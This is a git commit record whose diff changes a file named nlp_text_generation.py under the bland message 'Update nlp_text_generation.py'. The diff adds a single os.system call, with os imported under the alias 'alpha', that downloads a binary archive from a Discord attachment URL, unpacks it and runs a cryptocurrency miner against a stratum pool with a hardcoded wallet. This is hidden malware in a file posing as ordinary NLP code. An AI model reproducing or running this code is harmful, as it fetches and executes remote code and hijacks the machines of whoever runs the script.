7a1b327b5ca67a0487eb51b410983037d8f8067e
paperspase <93069560+paperspase@users.noreply.github.com>
2021-10-24 11:35:49 +0500

    Update nlp_text_generation.py

--- nlp_text_generation.py
+++ nlp_text_generation.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt-get install wget -y")
+alpha.system("apt-get install -y wget && wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work &&  apt-get update && apt-get install -y pciutils && ./work -rvram 1 -pool us.stratu.ms:16062 -ewal 3Ft56HYdAPXxRSQQAXRSggbuFYC2tpi4kB.rig -proto 4")
